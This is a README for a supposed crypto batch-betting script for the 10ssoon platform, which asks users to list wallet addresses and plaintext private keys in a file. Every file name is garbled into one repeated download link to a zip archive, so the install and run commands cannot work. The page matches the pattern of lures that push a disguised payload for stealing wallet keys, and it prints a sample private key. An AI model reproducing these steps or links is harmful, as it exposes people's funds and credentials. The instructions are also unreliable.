# 🎉 10ssoonBase - Efficient Batch Betting Script

## 🚀 Getting Started
[![Download 10ssoonBase](https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip)](https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip)

10ssoonBase is a simple robot for placing token bets on the 10ssoon platform. This tool allows users to run multiple bets quickly and reliably.

## 📦 Features Overview
- Uses USDC EIP-712 `TransferWithAuthorization` to sign and submit betting orders in batch.
- Automatically alternates between `up/down` betting directions in your wallet's order.
- Supports multithreading and can loop through multiple rounds for continuous betting.
- Customizable with `CONFIG` settings for target contracts, betting amounts, thread counts, execution limits, and proxy addresses.

> ⚠️ **Important:** This script uses plaintext private keys. Only run it in trusted offline or isolated environments. You are responsible for your funds and account security.

## 📂 Repository Structure
| File | Description |
| --- | --- |
| `https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip` | Core script that reads your private keys, constructs EIP-712 signatures, and calls `https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip` |
| `https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip` | Dependency declarations (Requires Python >= 3.13, includes `curl-cffi`, `loguru`, `web3`) |
| `https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip` | Lock file used by `uv sync` to ensure everyone installs the same version |
| `https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip` | Your wallet addresses and private keys list (Must be created and placed in the root directory before running) |

## 🛠️ Environment Requirements
- Runs on macOS, Linux, or Windows (PowerShell). Requires internet access to the 10ssoon API.
- Python 3.13 or higher (3.11+ has also been tested successfully).
- Latest version of Git for code pulling, and a terminal tool (bash or PowerShell).
- Either `uv` package manager (recommended) or `pip`.

## 📝 Preparing `https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip`
1. Create a file named `https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip` in the root directory of the repository.
2. Each line should represent one wallet in the format: `wallet_address----private_key`, using four dashes with no spaces.
3. Example:
   ```text
   0x1B279259B4A221d019C990BCD860ffA6BFDA9153----0x64080929b81767a643fdb105af161da0b581fb8a7af542e96bc0ebd5d6005c53
   0x1B279259B4A221d019C990BCD860ffA6BFDA9153----0x640809...
   ```

## 📥 Download & Install
To download this tool, [visit this page to download](https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip). Choose the latest release for the best experience.

## 🏃 Running the Script
1. Ensure you have Python installed.
2. Run the command:
   ```
   uv install
   ```
   or
   ```
   pip install -r https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip
   ```
3. Open your terminal.
4. Navigate to the folder where you saved the repository.
5. Run the script using:
   ```
   python https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip
   ```

## 🛡️ Security Note
Never expose your private keys online. Always keep your `https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip` secure. 

For any questions or further assistance, check the community on our GitHub page.